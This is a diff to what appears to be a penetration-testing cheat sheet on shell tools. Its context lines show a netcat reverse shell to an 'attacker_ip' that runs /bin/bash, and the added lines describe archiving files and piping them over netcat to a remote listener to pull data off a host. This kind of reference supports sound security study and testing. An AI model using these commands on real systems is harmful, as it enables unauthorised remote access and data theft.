@@ -142,6 +142,16 @@ nc -lvvp 8080   // listen to the 8080 port
 nc attacker_ip 8080 -t -e /bin/bash
 ```
 build up a connection then execute `/bin/bash`  
+Here, I also introduce the way to dump the remote file with netcat:  
+```php
+// receive side
+nc -lvvp 8080 > file.tar.gz   // listen and save the compressed file as file.tar.gz
+
+// sender side
+tar -czvf file.tar.gz path/to/file [path/to/file2 path/to/file3 ...]
+cat file.tar.gz | nc receive_ip listen_port
+```  
+Then, you can use `tar -xzvf file.tar.gz` to extract the archive on the receive side.  
 
 3. socat  
 ```php
